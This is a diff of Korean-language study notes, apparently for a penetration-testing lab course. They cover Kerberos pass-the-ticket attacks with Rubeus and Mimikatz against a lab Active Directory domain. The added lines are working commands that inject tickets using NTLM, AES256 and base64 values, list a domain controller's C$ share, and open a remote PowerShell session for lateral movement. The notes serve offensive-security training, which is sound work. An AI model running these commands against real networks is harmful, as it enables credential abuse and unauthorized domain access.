@@ -517,6 +517,9 @@ c:\tools> dir *.kirbi
 ```
 - `$`로 끝나는 티켓은 Active Directory와 상호 작용하려면 티켓이 필요한 컴퓨터 계정에 해당<br/>
 - 사용자 티켓에는 사용자의 이름과 서비스 이름과 도메인을 구분하는 `@`가 뒤따름(예: `[randomvalue]-username@service-domain.local.kirbi`)<br/>
+> Mimikatz 버전 2.2.0 20220919를 사용하여 "sekurlsa::ekeys"를 실행하면 일부 Windows 10 버전에서 모든 해시가 des_cbc_md4로 표시.
+> 내보낸 티켓(sekurlsa::tickets/export)이 잘못된 암호화로 인해 올바르게 작동하지 않음.
+> 새 티켓을 생성하거나 Rubeus를 사용하여 기본 64 형식으로 티켓을 내보냄
 
 #### Rubeus - Export Tickets
 ```c:\tools> Rubeus.exe dump /nowrap```
@@ -544,14 +547,20 @@ mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8
 ### Pass the Ticket(PtT)
 
 #### Rubeus Pass the Ticket
-- ```c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt```<br/>
-- ```c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi```
+```c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt```<br/>
+```
+c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+c:\tools> dir \\DC01.inlanefreight.htb\c$
+```
 
 #### Convert .kirbi to Base64 Format
 ```PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))```
 
 #### Pass the Ticket - Base64 Format
-```Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>```
+```
+Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
+c:\tools> dir \\DC01.inlanefreight.htb\c$
+```
 
 #### Mimikatz - Pass the Ticket
 ```
@@ -580,7 +589,12 @@ PS C:\tools> Enter-PSSession -ComputerName DC01
 ```C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show```
 
 #### Rubeus - Pass the Ticket for Lateral Movement
-```C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt```
+```
+C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
+c:\tools> powershell
+PS C:\tools> Enter-PSSession -ComputerName DC01
+[DC01]: PS C:\Users\john\Documents> whoami
+```
 
 <br/><br/>
 ## Pass the Ticket (PtT) from Linux
@@ -589,7 +603,7 @@ PS C:\tools> Enter-PSSession -ComputerName DC01
 ### Linux 및 Active Directory 통합 식별
 - [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd)이라는 도구를 사용하여 Linux 머신이 도메인에 가입되었는지 확인<br/>
 ```$ realm list```
-- [sssd](https://sssd.io/) 또는 [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html)) 도구 사용 여부로 확인 가능<br/>
+- [sssd](https://sssd.io/) 또는 [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html) 도구 사용 여부로 확인 가능<br/>
 ```$ ps -ef | grep -i "winbind\|sssd"```<br/>
 - 참고 :  [블로그 게시물](https://web.archive.org/web/20210624040251/https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/)
 
